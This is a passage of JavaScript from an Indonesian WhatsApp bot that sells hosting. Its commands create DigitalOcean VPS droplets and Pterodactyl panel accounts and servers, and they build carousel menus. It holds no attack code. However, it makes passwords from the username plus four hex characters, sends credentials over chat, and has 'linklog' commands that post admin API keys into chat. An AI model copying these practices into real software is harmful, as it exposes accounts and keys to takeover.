{ buttonId: '.menu', buttonText: { displayText: '𝐂𝐨𝐫𝐞˚𝐒𝐲𝐬𝐭𝐞𝐦', }, type: 1, nativeFlowInfo: { name: 'single_select', paramsJson: JSON.stringify(listMessage), }, viewOnce: true, }
                ]
                
                TamaMods.sendMessage(m.chat, {
                	    image: { url: "https://files.catbox.moe/wbl5er.jpg" },
                	    caption: teks,
                    	footer: global.footer,
                    	buttons: Vyunicos,
                	    headerType: 1,
                	    viewOnce: true,
                    }, { quoted: pantek })
}
break  

case '1gb1c':
case '2gb1c':
case '2gb2c':
case '4gb2c':
case '8gb4c':
case '16gb4c': {
if (!isCreator) return Reply(mess.owner)
    let size;

    // Pilih konfigurasi VPS berdasarkan tombol
    switch (command) {
        case '1gb1c':
            size = 's-1vcpu-1gb';
            break;
        case '2gb1c':
            size = 's-1vcpu-2gb';
            break;
        case '2gb2c':
            size = 's-2vcpu-2gb';
            break;
        case '4gb2c':
            size = 's-2vcpu-4gb';
            break;
        case '8gb4c':
            size = 's-4vcpu-8gb';
            break;
        default:
            size = 's-4vcpu-16gb-amd';
    }

    // Data untuk pembuatan VPS
    let dropletData = {
        name: global.hostname,
        region: 'nyc3', // Wilayah
        size: size,
        image: 'ubuntu-20-04-x64',
        ssh_keys: null,
        backups: false,
        ipv6: true,
        user_data: null,
        private_networking: null,
        volumes: null,
        tags: ['TamaMods']
    };

    try {
        // Generate password secara acak
        let password = await generateRandomPassword();
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        // Request ke API DigitalOcean
        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer ' + global.apidigitalocean
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletId = responseData.droplet.id;

            // Tunggu VPS selesai dibuat
            await Reply('Sedang membuat VPS, mohon tunggu...');
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Ambil informasi VPS yang telah dibuat
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': 'Bearer ' + global.apidigitalocean
                }
            });

            let dropletDetails = await dropletResponse.json();
            let ipVPS = dropletDetails.droplet.networks.v4[0]?.ip_address || 'IP tidak ditemukan';

            // Kirim detail VPS ke pengguna
            let messageText = `✅ VPS Berhasil Dibuat!\n\n`;
            messageText += `🌐 Hostname: ${global.hostname}\n`;
            messageText += `💻 Konfigurasi: ${size}\n`;
            messageText += `🔑 Password: ${password}\n`;
            messageText += `🌍 IP VPS: ${ipVPS}\n`;

            await TamaMods.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(responseData.message || 'Kesalahan tidak diketahui.');
        }
    } catch (err) {
        console.error(err);
        Reply(`Terjadi kesalahan: ${err.message}`);
    }
    break;
}

case 'linklog': {
if (!isCreator) return Reply(mess.owner)
let linklog = `*halo @${m.pushName} 👋*

*LINK LOGIN PANEL*

*Link Login*
${global.domain}

Apikey
${global.apikey}

Capikey
${global.capikey}

▬▭▬▭▬▭▬▭▬▭▬▭▬`
Reply(linklog)
}
break
//------(Batas Case)------//
case 'linklog-v2': {
if (!isCreator) return Reply(mess.owner)
let linklog = `*halo @${m.pushName} 👋*

*LINK LOGIN PANEL*

*Link Login*
${global.domainV2}

Apikey
${global.apikeyV2}

Capikey
${global.capikeyV2}

▬▭▬▭▬▭▬▭▬▭▬▭▬`
Reply(linklog)
}
break

//================================================================================

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator && !isSellerr) return Reply(mess.seller2)
if (!text) return Reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return Reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Succesfully Create Server Panel*\nData akun sudah dikirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Succes Create Akun Panel*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV2}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await TamaMods.sendMessage(orang, {text: teks}, {quoted: pantek})
delete global.panel
}
break
//------(Batas Case)------//
case "cpanel": {
if (!isCreator && !isSeller) return Reply(mess.seller)
if (!q) return Reply(example("username"));
    global.panel = [text.toLowerCase()]
let teks = `Pilih Ram Panel Dibawah ini`
const sections = [{
	    	title: '𝑻𝒂𝒎𝒂 </> 𝑺𝒖𝒑𝒆𝒓𝒊𝒐𝒓',
	    	highlight_label: "🎭꙳͙͡༑ᐧ ̬𝑺𝒊𝒎𝒑𝒍𝒆 𝑩𝒐𝒕 𝑽𝟐̬꙳͙͡༑ᐧ〽️",
	    	rows: [{
	    		title: "1GB", description: "Create Ram 1GB", id: ".1gb1"
	    	}]
	    }, {	    	
	    	rows: [{
	    		title: "2GB", description: "Create Ram 2GB", id: ".2gb1"
	    	}, {
	    		title: "3GB", description: "Create Ram 3GB", id: ".3gb1"
	    	},
	    	{
	    		title: "4GB", description: "Create Ram 4GB", id: ".4gb1"
	    	},
	    	{
	    		title: "5GB", description: "Create Ram 5GB", id: ".5gb1"
	    	},
	    	{
	    		title: "6GB", description: "Create Ram 6GB", id: ".6gb1"
	    	},
	    	{
	    		title: "7GB", description: "Create Ram 7GB", id: ".7gb1"
	    	},
	    	{
	    		title: "8GB", description: "Create Ram 8GB", id: ".8gb1"
	    	},
	    	{
	    		title: "9GB", description: "Create Ram 9GB", id: ".9gb1"
	    	},
	    	{
	    		title: "10GB", description: "Create Ram 10GB", id: ".10gb1"
	    	},
	    	{
	    		title: "UNLIMITED", description: "Create Ram Unlimited", id: ".unli1"
	    	}]
	    }]
	    
	    let listMessage = {
	    	title: "options",
	    	sections
	    }

const Vyunicos = [
{ buttonId: '.menu', buttonText: { displayText: '𝐂𝐨𝐫𝐞˚𝐒𝐲𝐬𝐭𝐞𝐦', }, type: 1, nativeFlowInfo: { name: 'single_select', paramsJson: JSON.stringify(listMessage), }, viewOnce: true, }
                ]
                
                TamaMods.sendMessage(m.chat, {
                	    image: { url: "https://files.catbox.moe/wbl5er.jpg" },
                	    caption: teks,
                    	footer: global.footer,
                    	buttons: Vyunicos,
                	    headerType: 1,
                	    viewOnce: true,
                    }, { quoted: pantek })
}
break  

case "addpanel": case "buatpanel": {
if (!isCreator && !isSeller) return Reply(mess.seller)
if (global.apikey.length < 1) return Reply("Apikey Tidak Ditemukan!")
if (!args[0]) return Reply(example("nama"))
global.panel = [text.toLowerCase()]
let imgnya = await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/wbl5er.jpg" }}, { upload: TamaMods.waUploadToServer })
global.panel = [text.toLowerCase()]
const msgii = await generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: "Silahkan Pilih Ram Server Panel Yang Tersedia Di Bawah Ini"
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: [
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *1GB*
* CPU Server *40%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 1GB\",\"title\":\"Create\",\"id\":\".cp1gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *2GB*
* CPU Server *60%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 2GB\",\"title\":\"Create\",\"id\":\".cp2gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *3GB*
* CPU Server *80%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
 text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 3GB\",\"title\":\"Create\",\"id\":\".cp3gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *4GB*
* CPU Server *100%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 4GB\",\"title\":\"Create\",\"id\":\".cp4gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *5GB*
* CPU Server *120%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 5GB\",\"title\":\"Create\",\"id\":\".cp5gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *6GB*
* CPU Server *140%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 6GB\",\"title\":\"Create\",\"id\":\".cp6gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *7GB*
* CPU Server *160%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 7GB\",\"title\":\"Create\",\"id\":\".cp7gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *8GB*
* CPU Server *180%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 8GB\",\"title\":\"Create\",\"id\":\".cp8gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *9GB*
* CPU Server *220%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 9GB\",\"title\":\"Create\",\"id\":\".cp9gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *10GB*
* CPU Server *220%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 10GB\",\"title\":\"Create\",\"id\":\".cp10gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *Unlimited*
* CPU Server *Unlimited*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram Unlimited\",\"title\":\"Create\",\"id\":\".cpunliv4\"}"
                  }
                ]
              })
            }
          ]
        })
      })
    }
  }
}, {userJid: m.sender, quoted: qtoko})

await TamaMods.relayMessage(msgii.key.remoteJid, msgii.message, {
  messageId: msgii.key.id
})
}
break
//------(Batas Case)------//
case "cp1gbv4": case "cp2gbv4": case "cp3gbv4": case "cp4gbv4": case "cp5gbv4": case "cp6gbv4": case "cp7gbv4": case "cp8gbv4": case "cp9gbv4": case "cp10gbv4": case "cpunliv4": {
if (!isCreator && !isSeller) return Reply(mess.seller)
if (global.panel == null) return Reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gbv4") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gbv4") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gbv4") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gbv4") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gbv4") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gbv4") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gbv4") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gbv4") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gbv4") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gbv4") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isCreator && !isSeller) return Reply(mess.seller)
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return Reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Seller Hanya*
        *Mengirim 1 Kali!*
* *Data Hilang/Lupa*
        *Akun, Seller Tidak Akan*
        *Bertanggung Jawab!*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Membawa Bukti Ss Chat Saat*
        *Pembelian*
`
await TamaMods.sendMessage(orang, {text: teks}, {quoted: pantek})
delete global.panel
}
break
//------(Batas Case)------//
case "addpanel2": case "buatpanel2": {
if (!isCreator && !isSellerr) return Reply(mess.seller2)
if (global.apikey.length < 1) return Reply("Apikey Tidak Ditemukan!")
if (!args[0]) return Reply(example("nama,628xx"))
if (!text.split(",")) return Reply(example("nama,628xx"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return Reply(example("nama,628xx"))
var ceknya = text.split(",")[1]
if (!ceknya) return Reply(example("nama,628xx"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await TamaMods.onWhatsApp(ceknya)
if (check.length < 1) return Reply("Nomor Buyyer Tidak Valid!")
global.panel2 = [buyyer, client]
let imgnya = await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/wbl5er.jpg" }}, { upload: TamaMods.waUploadToServer })
global.panel = [text.toLowerCase()]
const msgii = await generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: "Silahkan Pilih Ram Server Panel Yang Tersedia Di Bawah Ini"
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: [
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *1GB*
* CPU Server *40%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 1GB\",\"title\":\"Create\",\"id\":\".cp1gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *2GB*
* CPU Server *60%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 2GB\",\"title\":\"Create\",\"id\":\".cp2gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *3GB*
* CPU Server *80%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
 text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 3GB\",\"title\":\"Create\",\"id\":\".cp3gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *4GB*
* CPU Server *100%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 4GB\",\"title\":\"Create\",\"id\":\".cp4gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *5GB*
* CPU Server *120%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 5GB\",\"title\":\"Create\",\"id\":\".cp5gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *6GB*
* CPU Server *140%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 6GB\",\"title\":\"Create\",\"id\":\".cp6gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *7GB*
* CPU Server *160%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 7GB\",\"title\":\"Create\",\"id\":\".cp7gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *8GB*
* CPU Server *180%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 8GB\",\"title\":\"Create\",\"id\":\".cp8gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *9GB*
* CPU Server *220%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 9GB\",\"title\":\"Create\",\"id\":\".cp9gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *10GB*
* CPU Server *220%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
